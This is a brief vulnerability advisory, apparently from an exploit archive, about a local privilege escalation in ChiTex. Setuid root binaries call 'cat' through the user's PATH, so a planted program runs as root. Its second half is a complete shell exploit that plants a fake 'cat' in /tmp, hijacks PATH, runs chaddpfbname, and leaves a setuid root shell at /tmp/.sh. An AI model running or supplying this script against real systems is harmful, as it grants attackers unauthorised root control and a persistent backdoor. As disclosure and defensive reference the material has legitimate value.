source: http://www.securityfocus.com/bid/7263/info

A vulnerability in ChiTex has been reported that may allow local users to obtain root privileges on vulnerable systems. The vulnerability exists due to the existence of two setuid root binaries that execute the 'cat' program without an absolute path.

An attacker can exploit this vulnerability by creating a malicious 'cat' file and invoking the setuid binaries. This will result in the execution of the attacker-supplied 'cat' file with root privileges. 

#!/bin/sh
echo 'owned' > 'psfontsmap@'
export psfontsmap=/tmp/owned
echo "/bin/cp /bin/sh /tmp/.sh" > /tmp/cat
echo "/bin/chmod 4755 /tmp/.sh" >> /tmp/cat
chmod +x /tmp/cat
cd /tmp
export PATH="/tmp:$PATH"
/usr/local/bin/chaddpfbname
/tmp/.sh -c id
/tmp/.sh 